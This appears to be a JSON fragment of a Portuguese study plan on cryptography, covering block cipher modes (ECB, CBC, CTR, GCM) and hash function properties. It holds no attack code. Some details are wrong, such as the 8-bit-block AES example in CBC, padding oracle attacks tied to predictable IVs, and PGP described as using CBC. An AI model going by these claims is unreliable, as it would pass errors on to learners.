                                  "verification": "Resuma em 3 frases os conceitos chave e desenhe um diagrama simples de blocos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Livro ou slides sobre criptografia simétrica",
                                    "Papel e caneta para diagramas"
                                  ],
                                  "tips": "Use analogias como 'cortando um texto em pedaços fixos' para visualizar.",
                                  "learningObjective": "Compreender como os cifradores em bloco dividem dados e por que modos de operação são necessários.",
                                  "commonMistakes": "Confundir cifradores em bloco com fluxos contínuos como stream ciphers."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Descrever o Funcionamento do Modo ECB",
                                  "subSteps": [
                                    "Explique que ECB (Electronic Codebook) cifra cada bloco de plaintext independentemente com a mesma chave.",
                                    "Descreva o processo: plaintext → dividir em blocos → cifrar cada um → concatenar ciphertexts.",
                                    "Mostre que blocos idênticos na plaintext produzem ciphertexts idênticos.",
                                    "Implemente um exemplo simples em pseudocódigo ou Python usando uma função de cifragem fictícia.",
                                    "Compare com decifragem: reverso exato do processo."
                                  ],
                                  "verification": "Escreva pseudocódigo para ECB e teste com dois blocos idênticos.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Editor de código (Python/Jupyter)",
                                    "Biblioteca cryptography ou pycryptodome"
                                  ],
                                  "tips": "Sempre use IV ou padding em exemplos reais, mas destaque independência no ECB.",
                                  "learningObjective": "Articular precisamente o processo de cifragem e decifragem no modo ECB.",
                                  "commonMistakes": "Achar que ECB usa IV; ECB não usa inicialização vector."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Vulnerabilidades do Modo ECB",
                                  "subSteps": [
                                    "Analise como padrões repetidos na plaintext (ex: imagens PNG com áreas uniformes) vazam no ciphertext.",
                                    "Discuta ataques de texto plano conhecido: blocos idênticos revelam padrões.",
                                    "Examine exemplos clássicos: cifrar a imagem do pinguim do Linux com ECB.",
                                    "Explique perda de difusão: mudanças em um bloco não afetam outros.",
                                    "Liste consequências: facilita análise estatística e quebra de padrões."
                                  ],
                                  "verification": "Cifre uma imagem simples com ECB e identifique padrões visíveis no ciphertext.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Ferramenta online ECB penguin (ex: cryptii.com)",
                                    "Imagem bitmap simples"
                                  ],
                                  "tips": "Visualize o ciphertext como imagem para ver padrões imediatamente.",
                                  "learningObjective": "Reconhecer e explicar as fraquezas criptográficas específicas do ECB.",
                                  "commonMistakes": "Subestimar impacto em dados não aleatórios como texto ou imagens."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar ECB com Outros Modos e Concluir",
                                  "subSteps": [
                                    "Compare ECB com CBC (usa IV e XOR entre blocos).",
                                    "Discuta quando ECB pode ser usado (dados muito curtos e aleatórios).",
                                    "Resuma por que ECB é obsoleto para a maioria das aplicações.",
                                    "Crie um quadro comparativo de prós/contras.",
                                    "Pratique explicando ECB em uma frase concisa."
                                  ],
                                  "verification": "Crie um quadro comparativo e explique verbalmente para si mesmo.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Tabela em Excel ou papel",
                                    "Referências sobre modos CBC/CTR"
                                  ],
                                  "tips": "Memorize: 'ECB é simples mas revela padrões como um livro de códigos aberto'.",
                                  "learningObjective": "Contextualizar ECB em relação a modos mais seguros.",
                                  "commonMistakes": "Pensar que ECB é seguro para qualquer dado; enfatize aleatoriedade necessária."
                                }
                              ],
                              "practicalExample": "Cifre uma imagem 128x128 pixels (ex: pinguim preto e branco) usando AES-ECB. Blocos uniformes (preto) produzirão ciphertext idêntico, revelando o formato da imagem no ciphertext visualizado como imagem, demonstrando vazamento de padrões.",
                              "finalVerifications": [
                                "Descreva ECB em uma frase sem consultar notas.",
                                "Identifique corretamente 3 vulnerabilidades do ECB.",
                                "Explique diferença chave entre ECB e CBC.",
                                "Cifre/decifre manualmente 2 blocos idênticos.",
                                "Analise uma imagem cifrada em ECB e aponte padrões.",
                                "Liste cenários onde ECB é inadequado."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição do processo ECB (independência de blocos).",
                                "Identificação correta de vulnerabilidades (padrões repetidos).",
                                "Uso de exemplos visuais/concretos (imagens/texto).",
                                "Comparação clara com outros modos.",
                                "Explicação de impactos no mundo real (vazamentos).",
                                "Clareza e estrutura na comunicação."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Operações modulares e funções bijetivas em blocos.",
                                "Programação: Implementação de algoritmos criptográficos em Python.",
                                "Física/Engenharia: Analogia com sinais periódicos e análise espectral.",
                                "Estatística: Análise de frequência em ciphertexts."
                              ],
                              "realWorldApplication": "ECB é evitado em protocolos modernos (ex: TLS usa GCM); usado historicamente em sistemas legados, mas sua vulnerabilidade levou a ataques como em cartões de crédito antigos ou armazenamento de imagens sensíveis, enfatizando a necessidade de modos como CBC ou CTR para ocultar padrões em dados reais."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.4.2",
                            "name": "Analisar o modo CBC",
                            "description": "Detalhar uso de IV e XOR com bloco anterior para dependência em cadeia, prevenindo padrões mas requerendo IV único e não reutilizável.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os fundamentos do modo CBC",
                                  "subSteps": [
                                    "Estude a definição de Cipher Block Chaining (CBC): modo de operação que introduz dependência entre blocos.",
                                    "Identifique os componentes principais: chave simétrica, Inicialization Vector (IV) de tamanho de bloco, texto plano dividido em blocos.",
                                    "Aprenda a operação XOR: bitwise exclusive OR entre o bloco anterior cifrado (ou IV) e o bloco atual de texto plano.",
                                    "Analise o propósito: prevenir cifragem de padrões idênticos em blocos iguais, tornando a saída única.",
                                    "Revise diagramas visuais do fluxo CBC para fixar a cadeia de dependência."
                                  ],
                                  "verification": "Descreva verbalmente ou por escrito os componentes e o papel do XOR no CBC.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Diagrama de modo CBC (imagem ou vídeo explicativo)",
                                    "Notas sobre XOR bitwise"
                                  ],
                                  "tips": "Pense no CBC como uma 'corrente' onde cada bloco depende do anterior para quebrar padrões.",
                                  "learningObjective": "Identificar e explicar os componentes essenciais do modo CBC e sua dependência em cadeia.",
                                  "commonMistakes": [
                                    "Confundir IV com chave de cifragem",
                                    "Ignorar que IV deve ser único por mensagem",
                                    "Achar que CBC não usa padding"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Detalhar o processo de cifragem no modo CBC",
                                  "subSteps": [
                                    "Divida o texto plano em blocos de tamanho fixo (ex: 128 bits para AES).",
                                    "Para o primeiro bloco: XOR com IV, depois cifrar com a chave para obter C1.",
                                    "Para blocos subsequentes: XOR do bloco plano atual com C(n-1), depois cifrar para Cn.",
                                    "Adicione padding se necessário no último bloco (ex: PKCS#7).",
                                    "Simule manualmente com blocos pequenos (ex: 8 bits) usando calculadora XOR."
                                  ],
                                  "verification": "Execute uma cifragem manual simples e compare com um diagrama esperado.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Calculadora online para XOR",
                                    "Exemplo de texto plano curto como 'ABC'",
                                    "Ferramenta como CyberChef para validação"
                                  ],
                                  "tips": "Comece sempre pelo IV para o primeiro bloco; memorize a fórmula: Cn = Encrypt(K, Pn XOR C(n-1)).",
                                  "learningObjective": "Executar e descrever passo a passo o processo de cifragem CBC.",
                                  "commonMistakes": [
                                    "Reutilizar IV em múltiplas mensagens",
                                    "Esquecer XOR antes da cifragem",
                                    "Não aplicar padding corretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explicar o processo de decifragem no modo CBC",
                                  "subSteps": [
                                    "Para o primeiro bloco: Decifrar C1 com chave para obter D1, depois XOR com IV para recuperar P1.",
                                    "Para blocos subsequentes: Decifrar Cn com chave para Dn, XOR com C(n-1) para Pn.",
                                    "Remova o padding do último bloco após recuperação.",
                                    "Note que erro em um bloco afeta apenas o bloco decifrado, mas o próximo fica incorreto devido à cadeia.",
                                    "Simule decifragem reversa do exemplo de cifragem anterior."
                                  ],
                                  "verification": "Recupere o texto plano original a partir de uma sequência de blocos cifrados CBC.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Mesmos blocos cifrados do Step 2",
                                    "Tabela de XOR reversível (idêntica)",
                                    "CyberChef ou script Python simples"
                                  ],
                                  "tips": "Decifragem é assimétrica: XOR é feito APÓS a decifração, exceto que o IV é usado só no primeiro.",
                                  "learningObjective": "Dominar o processo reverso de decifragem e entender propagação de erros.",
                                  "commonMistakes": [
                                    "XOR antes da decifração",
                                    "Usar IV nos blocos subsequentes",
                                    "Ignorar propagação de erros na cadeia"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar implicações de segurança e uso do IV",
                                  "subSteps": [
                                    "Discuta vantagens: avalaanche effect, previne padrões em texto plano repetitivo.",
                                    "Analise riscos: IV reutilizável com mesma chave permite ataques chosen-plaintext (ex: recuperar XOR de blocos).",
                                    "Aprenda melhores práticas: IV aleatório e único por mensagem, nunca reutilizar.",
                                    "Estude falhas conhecidas: padding oracle se IV previsível.",
                                    "Compare com outros modos (ex: ECB vs CBC) para reforçar dependência em cadeia."
                                  ],
                                  "verification": "Explique um cenário de ataque com IV reutilizado e como evitá-lo.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Exemplos de ataques CBC (artigos ou vídeos)",
                                    "Comparação ECB/CBC visual"
                                  ],
                                  "tips": "IV é público, mas deve ser imprevisível; gere com cripto-rNG forte.",
                                  "learningObjective": "Avaliar riscos de segurança do CBC e práticas recomendadas para IV.",
                                  "commonMistakes": [
                                    "Tratar IV como secreto",
                                    "Usar contador previsível como IV",
                                    "Subestimar impacto de reutilização"
                                  ]
                                }
                              ],
                              "practicalExample": "Cifrar a mensagem 'HELLO WORLD' em blocos de 8 bits usando AES simulado com chave 'KEY12345' e IV 'START123'. Bloco1: 'HELLO WO' XOR 'START123' -> cifrar -> C1. Bloco2: 'RLD' + padding XOR C1 -> cifrar -> C2. Decifre passo a passo para verificar recuperação exata.",
                              "finalVerifications": [
                                "Explicar o papel exato do IV e XOR na cadeia CBC.",
                                "Simular cifragem/decifragem de 2 blocos manualmente.",
                                "Identificar por que IV único previne ataques de padrões.",
                                "Descrever propagação de erros em CBC.",
                                "Comparar CBC com ECB em termos de segurança.",
                                "Listar 3 melhores práticas para uso de IV."
                              ],
                              "assessmentCriteria": [
                                "Precisão na sequência de XOR e cifragem/decifragem (100% correta).",
                                "Compreensão clara da dependência em cadeia e papel do IV.",
                                "Identificação correta de riscos como reutilização de IV.",
                                "Explicação de vantagens sobre modos sem chaining.",
                                "Uso correto de terminologia (bloco, padding, avalanche).",
                                "Capacidade de simular exemplo prático sem erros."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Operações bitwise XOR e aritmética modular.",
                                "Programação: Implementação de CBC em Python com bibliotecas como cryptography.",
                                "Redes de Computadores: Aplicação em protocolos TLS/SSL e VPNs.",
                                "Probabilidade: Geração de IV aleatório e entropia."
                              ],
                              "realWorldApplication": "O modo CBC é amplamente usado em protocolos como TLS para HTTPS, protegendo dados em trânsito em sites bancários e e-mails criptografados (ex: PGP), garantindo que mensagens idênticas não gerem cifrados idênticos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.4.3",
                            "name": "Explicar modos de fluxo como CTR",
                            "description": "Descrever geração de keystream via contador incrementado e XOR com plaintext, permitindo paralelismo e uso em streams sem padding.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Conceitos Básicos de Modos de Fluxo",
                                  "subSteps": [
                                    "Defina modos de operação de cifradores em bloco e sua importância para dados de tamanho arbitrário.",
                                    "Explique a diferença entre modos de bloco (como CBC) e modos de fluxo (como CTR).",
                                    "Introduza o Counter Mode (CTR) como um modo de fluxo que transforma um cifrador em bloco em um fluxo de keystream.",
                                    "Descreva os componentes principais: chave simétrica, nonce/IV e contador.",
                                    "Discuta por que modos de fluxo são adequados para streams contínuos."
                                  ],
                                  "verification": "Resuma em uma frase o que diferencia CTR de CBC e liste os três componentes principais.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Diagrama de modos de operação (impresso ou digital)",
                                    "Vídeo introdutório sobre criptografia simétrica (ex: Khan Academy)"
                                  ],
                                  "tips": [
                                    "Use analogias como 'máquina de cifrar fluxo' para visualizar o keystream infinito."
                                  ],
                                  "learningObjective": "Compreender o papel dos modos de fluxo e posicionar o CTR no contexto de criptografia.",
                                  "commonMistakes": [
                                    "Confundir CTR com OFB/CTR (ambos fluxo, mas CTR usa contador)",
                                    "Ignorar o papel do nonce para unicidade"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Geração do Keystream no Modo CTR",
                                  "subSteps": [
                                    "Explique como o keystream é gerado: concatenação de nonce/IV com contador incrementado.",
                                    "Descreva o processo: E_k(nonce || counter), onde E_k é o cifrador em bloco (ex: AES).",
                                    "Mostre como o contador é incrementado (geralmente em big-endian, como um número de 128 bits).",
                                    "Ilustre com um exemplo numérico simples: IV=0, counter=1 → bloco 1, counter=2 → bloco 2.",
                                    "Enfatize que o keystream é independente do plaintext."
                                  ],
                                  "verification": "Gere manualmente o primeiro keystream block para IV=0x1234 e counter=1 usando AES-128 fictício.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Calculadora hexadecimal",
                                    "Ferramenta online como CyberChef para simular AES",
                                    "Papel e caneta para desenhos"
                                  ],
                                  "tips": [
                                    "Pense no contador como um odômetro: incrementa linearmente para gerar blocos únicos."
                                  ],
                                  "learningObjective": "Dominar o mecanismo exato de geração de keystream via contador.",
                                  "commonMistakes": [
                                    "Reutilizar o mesmo (nonce||counter) pair, levando a keystream reuse",
                                    "Confundir incrementação do contador com padding"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Processo de Encriptação e Decriptação com CTR",
                                  "subSteps": [
                                    "Descreva a encriptação: keystream XOR plaintext → ciphertext (bloco a bloco ou stream).",
                                    "Explique a decryptação: idêntica à encriptação (XOR ciphertext com mesmo keystream).",
                                    "Discuta paralelismo: blocos podem ser processados independentemente.",
                                    "Aborde streams sem padding: processa dados de qualquer tamanho sem preenchimento.",
                                    "Simule um exemplo completo com plaintext curto."
                                  ],
                                  "verification": "Encripte e decripte uma mensagem de 16 bytes manualmente usando keystream fictício.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Editor de texto para simular XOR (ex: Python snippet simples)",
                                    "Tabela ASCII/hex para XOR manual"
                                  ],
                                  "tips": [
                                    "Lembre: XOR é simétrico, por isso encrypt=decrypt no CTR."
                                  ],
                                  "learningObjective": "Executar e entender o fluxo completo de CTR para plaintext arbitrário.",
                                  "commonMistakes": [
                                    "Aplicar cifrador em bloco diretamente no plaintext",
                                    "Esquecer alinhamento de blocos no stream"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Vantagens, Limitações e Aplicações do CTR",
                                  "subSteps": [
                                    "Liste vantagens: paralelismo, sem padding, velocidade em hardware.",
                                    "Discuta limitações: necessidade de nonce único, sem autenticação (use com AEAD).",
                                    "Compare com outros modos de fluxo (ex: OFB vs CTR).",
                                    "Explore cenários de uso: streams de vídeo, rede de pacotes.",
                                    "Reflita sobre segurança: ataques se nonce reutilizado."
                                  ],
                                  "verification": "Escreva 3 vantagens e 2 riscos do CTR em comparação com CBC.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Tabela comparativa de modos (RFC 5116)",
                                    "Artigo sobre CTR em TLS"
                                  ],
                                  "tips": [
                                    "Associe paralelismo a 'processamento GPU-friendly' para retenção."
                                  ],
                                  "learningObjective": "Avaliar o CTR criticamente no contexto de aplicações reais.",
                                  "commonMistakes": [
                                    "Achar CTR 'inseguro' sem contexto (é seguro se nonce único)",
                                    "Ignorar combinação com MAC para integridade"
                                  ]
                                }
                              ],
                              "practicalExample": "Para encriptar 'HELLO WORLD' (11 bytes) com AES-128, chave K=0x2b7e151628aed2a6abf7158809cf4f3c, nonce=0x1234567890abcdef00: Gere keystream E_K(nonce||0)=bloco1 (16 bytes), XOR com padded plaintext. Resultado parcial: primeiros bytes XOR produz ciphertext stream. Decripte XORing mesmo keystream.",
                              "finalVerifications": [
                                "Descreva verbalmente o processo de geração de keystream.",
                                "Explique por que CTR permite paralelismo.",
                                "Identifique o que acontece se nonce for reutilizado.",
                                "Simule XOR de 8 bytes de plaintext com keystream.",
                                "Liste 2 aplicações reais de CTR.",
                                "Diferencie CTR de CBC em um diagrama simples."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição do contador e XOR (90%+ correto).",
                                "Capacidade de gerar keystream manualmente sem erros.",
                                "Explicação clara de paralelismo e ausência de padding.",
                                "Identificação correta de vantagens e riscos.",
                                "Uso de terminologia técnica apropriada (nonce, keystream, etc.).",
                                "Exemplo prático executado com acurácia."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Operações XOR e aritmética modular em contadores.",
                                "Programação: Implementação em Python/OpenSSL para simulação CTR.",
                                "Redes: Uso em protocolos como TLS 1.3 e IPsec.",
                                "Hardware: Otimização em GPUs para paralelismo.",
                                "Probabilidade: Análise de colisões em nonces."
                              ],
                              "realWorldApplication": "CTR é amplamente usado em WPA3 para Wi-Fi, TLS para HTTPS (com GCM), e streaming de vídeo no Netflix/YouTube, permitindo encriptação rápida de dados contínuos sem atrasos de padding ou dependências sequenciais."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.4.4",
                            "name": "Discutir modos autenticados como GCM",
                            "description": "Apresentar Galois/Counter Mode para confidencialidade e integridade/autenticação via MAC, ideal para protocolos como TLS 1.3.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos de Confidencialidade e Integridade em Criptografia Simétrica",
                                  "subSteps": [
                                    "Defina confidencialidade como a garantia de que apenas partes autorizadas acessem os dados.",
                                    "Explique integridade como a proteção contra modificações não autorizadas dos dados.",
                                    "Discuta autenticação como a verificação da origem e integridade via MAC (Message Authentication Code).",
                                    "Identifique limitações dos modos CBC e CTR puros em fornecer autenticação.",
                                    "Revise o papel dos modos de operação em cifradores de bloco como AES."
                                  ],
                                  "verification": "Resuma em um parágrafo as diferenças entre confidencialidade, integridade e autenticação, citando exemplos de falhas sem autenticação.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Slides ou notas sobre modos de operação básicos (CBC, CTR)",
                                    "Artigo introdutório sobre AEAD (Authenticated Encryption with Associated Data)"
                                  ],
                                  "tips": "Use diagramas para visualizar fluxos de encriptação/decryptação com e sem autenticação.",
                                  "learningObjective": "Diferenciar os três pilares de segurança (confidencialidade, integridade, autenticação) em contextos criptográficos.",
                                  "commonMistakes": "Confundir MAC com hash simples; ignorar que MAC requer chave compartilhada."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar o Modo Counter (CTR) para Confidencialidade",
                                  "subSteps": [
                                    "Descreva CTR como um modo stream que XORa plaintext com keystream gerado de contador.",
                                    "Explique a geração do nonce/IV e incremento do contador para evitar reutilização.",
                                    "Discuta vantagens: paralelismo, não requer padding, tamanho de saída igual ao input.",
                                    "Implemente um exemplo conceitual de CTR com AES-128.",
                                    "Analise vulnerabilidades de CTR sem autenticação (ex: malleability attacks)."
                                  ],
                                  "verification": "Gere manualmente um keystream para um bloco e demonstre XOR com plaintext simples.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Calculadora hexadecimal ou ferramenta online como CyberChef",
                                    "Documentação RFC 3686 sobre CTR"
                                  ],
                                  "tips": "Sempre inicialize o contador corretamente para evitar colisões.",
                                  "learningObjective": "Dominar o funcionamento do modo CTR e suas limitações sem autenticação.",
                                  "commonMistakes": "Reutilizar nonce/IV levando a ataques de keystream reuse."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Detalhar o Galois/Counter Mode (GCM) para Autenticação",
                                  "subSteps": [
                                    "Explique GCM como combinação de CTR para encriptação e GHASH (baseado em campos de Galois GF(2^128)) para autenticação.",
                                    "Descreva componentes: keystream CTR, AAD (Associated Data), tag de autenticação.",
                                    "Detalhe o cálculo da tag: GHASH sobre ciphertext + AAD + lengths, XOR com keystream derivado.",
                                    "Simule o processo de encriptação e verificação de tag em um exemplo numérico simplificado.",
                                    "Discuta parâmetros: chave 128/192/256 bits, nonce 96 bits padrão, tag 128 bits."
                                  ],
                                  "verification": "Calcule manualmente uma tag GHASH simples para dados de teste curtos.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Biblioteca de referência como OpenSSL man pages para GCM",
                                    "Ferramenta como aes-gcm.online para testes",
                                    "Papel e lápis para GF(2^128) basics"
                                  ],
                                  "tips": "Lembre que GHASH é sensível à ordem dos dados; teste com AAD vazio primeiro.",
                                  "learningObjective": "Explicar precisamente como GCM integra CTR e GHASH para AEAD.",
                                  "commonMistakes": "Confundir nonce com IV; ignorar autenticação de AAD."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Aplicações e Vantagens de GCM em Protocolos Modernos",
                                  "subSteps": [
                                    "Descreva o uso de GCM em TLS 1.3 como modo preferido para AEAD (AES-GCM).",
                                    "Compare GCM com CCM e ChaCha20-Poly1305 em termos de performance e segurança.",
                                    "Discuta ataques conhecidos (ex: nonce misuse) e mitigações.",
                                    "Revise implementações em bibliotecas como OpenSSL e BouncyCastle.",
                                    "Debata trade-offs: velocidade vs. segurança em hardware (AES-NI acelera GCM)."
                                  ],
                                  "verification": "Explique em uma apresentação curta por que TLS 1.3 escolheu GCM e como falhas de nonce impactam.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "RFC 5288 (GCM/AES)",
                                    "RFC 8446 (TLS 1.3)",
                                    "Vídeo introdutório sobre AEAD modes"
                                  ],
                                  "tips": "Compare benchmarks de GCM vs. outros modos para reforçar vantagens práticas.",
                                  "learningObjective": "Avaliar o papel de GCM em protocolos reais e suas implicações de segurança.",
                                  "commonMistakes": "Subestimar riscos de nonce reuse, levando a exposição total de dados."
                                }
                              ],
                              "practicalExample": "Implemente AES-GCM em Python usando a biblioteca cryptography: encripte 'Hello, TLS!' com AAD 'header', nonce aleatório, chave fixa; então decripte e verifique a tag. Teste falha alterando ciphertext para demonstrar rejeição por tag inválida.",
                              "finalVerifications": [
                                "Explicar verbalmente o fluxo completo de GCM desde nonce até tag verification.",
                                "Identificar e corrigir um nonce reutilizado em um cenário simulado.",
                                "Comparar GCM com CBC-MAC em um diagrama.",
                                "Demonstrar encriptação/decryptação com AAD usando ferramenta online.",
                                "Discutir impacto de uma tag inválida em TLS.",
                                "Listar 3 vantagens de GCM sobre modos não-autenticados."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de CTR e GHASH (sem erros conceituais).",
                                "Capacidade de simular cálculos manuais ou com ferramentas.",
                                "Compreensão de vulnerabilidades como nonce misuse.",
                                "Aplicação correta em contextos como TLS 1.3.",
                                "Uso de terminologia técnica precisa (AEAD, tag, AAD).",
                                "Análise crítica de trade-offs de performance/segurança."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Campos finitos GF(2^128) e multiplicação polinomial.",
                                "Programação: Implementação de criptografia em linguagens como Python/C++.",
                                "Redes: Integração em protocolos como TLS/IPsec.",
                                "Hardware: Otimizações com AES-NI instructions.",
                                "Ética: Implicações de falhas criptográficas em privacidade de dados."
                              ],
                              "realWorldApplication": "GCM é o modo AEAD padrão no TLS 1.3 para HTTPS, protegendo tráfego web (ex: banking apps, email); usado em VPNs (WireGuard), Wi-Fi WPA3 e apps móveis para encriptar comunicações sensíveis, garantindo que dados não sejam lidos ou alterados em trânsito."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.2.3",
                    "name": "Funções Hash",
                    "description": "Funções unidirecionais que produzem resumos de dados fixos, usadas para verificação de integridade e senhas.",
                    "individualConcepts": [
                      {
                        "id": "10.1.2.3.1",
                        "name": "Propriedades Fundamentais das Funções Hash",
                        "description": "Características essenciais das funções hash, incluindo unidirecionalidade, saída de tamanho fixo, resistência a pré-imagem, segunda pré-imagem, colisões e efeito avalanche, que garantem sua utilidade em segurança cibernética.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.3.1.1",
                            "name": "Definir função hash e suas propriedades básicas",
                            "description": "Explicar que uma função hash é unidirecional, produz resumo de tamanho fixo independentemente do input e é determinística, com exemplos simples de entrada e saída.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a definição fundamental de uma função hash",
                                  "subSteps": [
                                    "Leia a definição: uma função hash transforma dados de qualquer tamanho em um valor de tamanho fixo chamado hash ou digest.",
                                    "Identifique as características principais: unidirecional, determinística e saída de tamanho fixo.",
                                    "Compare com funções comuns, como soma ou concatenação de strings.",
                                    "Escreva a definição em suas próprias palavras.",
                                    "Pesquise brevemente exemplos históricos, como MD5 ou SHA-256."
                                  ],
                                  "verification": "Escreva uma definição clara em um documento e compare com fontes confiáveis.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Notebook e caneta",
                                    "Acesso à internet para definições básicas (ex: Wikipedia - Hash function)"
                                  ],
                                  "tips": "Pense na função hash como uma 'impressão digital' única para dados.",
                                  "learningObjective": "Definir precisamente o que é uma função hash e suas três propriedades básicas.",
                                  "commonMistakes": [
                                    "Confundir hash com criptografia reversível (chaves simétricas)",
                                    "Achar que hash muda o tamanho dos dados de entrada"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar a propriedade determinística",
                                  "subSteps": [
                                    "Entenda que a mesma entrada sempre produz o mesmo hash.",
                                    "Teste conceitualmente: hash('abc') = hash('abc') sempre.",
                                    "Diferencie de funções randômicas ou não-determinísticas.",
                                    "Crie dois exemplos idênticos de entrada e anote o conceito.",
                                    "Explique por que isso é crucial para verificação de integridade."
                                  ],
                                  "verification": "Demonstre com dois inputs iguais produzindo o mesmo output conceitual.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Papel para diagramas de input/output",
                                    "Calculadora online de hash simples (ex: md5hashgenerator.com)"
                                  ],
                                  "tips": "Sempre teste com entradas iguais para validar determinismo.",
                                  "learningObjective": "Explicar e exemplificar a propriedade determinística de funções hash.",
                                  "commonMistakes": [
                                    "Pensar que pequenas variações no input não afetam (elas afetam drasticamente)",
                                    "Confundir com funções estocásticas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar a propriedade de saída de tamanho fixo",
                                  "subSteps": [
                                    "Aprenda que independentemente do tamanho da entrada, o hash tem tamanho fixo (ex: SHA-256 = 256 bits).",
                                    "Compare entradas curtas e longas: 'a' vs. um livro inteiro -> mesmo tamanho de hash.",
                                    "Calcule tamanhos: liste algoritmos comuns e seus tamanhos (MD5: 128 bits, SHA-1: 160 bits).",
                                    "Desenhe um diagrama mostrando entrada variável -> saída fixa.",
                                    "Discuta implicações para eficiência computacional."
                                  ],
                                  "verification": "Liste 3 algoritmos hash com seus tamanhos fixos e compare saídas de entradas diferentes.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Tabela de algoritmos hash impressa ou online",
                                    "Ferramenta de hash online"
                                  ],
                                  "tips": "Lembre: fixo é o output, não o input – isso economiza espaço.",
                                  "learningObjective": "Demonstrar como funções hash produzem resumos de tamanho constante.",
                                  "commonMistakes": [
                                    "Acreditar que hash longo para input longo",
                                    "Ignorar que colisões podem ocorrer apesar do tamanho fixo"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Entender a propriedade unidirecional (one-way)",
                                  "subSteps": [
                                    "Defina unidirecional: fácil computar hash de input, impossível reverter para input original.",
                                    "Diferencie de funções bijetoras ou descriptografáveis.",
                                    "Exemplo: de 'senha123' você não recupera a senha do hash.",
                                    "Discuta ataques como rainbow tables e por que hashes são salted.",
                                    "Teste com ferramenta: gere hash e tente 'inverter' (não consegue)."
                                  ],
                                  "verification": "Explique em 2 frases por que não se pode reverter um hash e dê um exemplo.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Ferramenta online de hash (ex: hashlib em Python REPL)",
                                    "Artigo sobre one-way functions"
                                  ],
                                  "tips": "Unidirecional protege segredos; use salts para mais segurança.",
                                  "learningObjective": "Descrever a irreversibilidade das funções hash e suas implicações de segurança.",
                                  "commonMistakes": [
                                    "Confundir com ofuscação reversível",
                                    "Pensar que todos hashes são igualmente seguros contra reversão"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando Python: import hashlib; print(hashlib.sha256(b'hello').hexdigest()) resulta em '2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824' (64 chars). Repita com 'hello' -> mesmo; 'Hello' -> diferente, mas mesmo tamanho. Isso demonstra determinismo, tamanho fixo e unidirecionalidade (não dá pra voltar a 'hello').",
                              "finalVerifications": [
                                "Definir corretamente função hash em 1 frase.",
                                "Listar e explicar as 3 propriedades com exemplos.",
                                "Gerar hashes de 3 entradas diferentes mostrando tamanho fixo e determinismo.",
                                "Explicar por que não se pode reverter um hash.",
                                "Identificar uso real: verificação de senhas ou arquivos.",
                                "Diferenciar hash de criptografia simétrica."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição e propriedades (sem erros conceituais).",
                                "Exemplos concretos e corretos de input/output.",
                                "Demonstração prática com ferramenta de hash.",
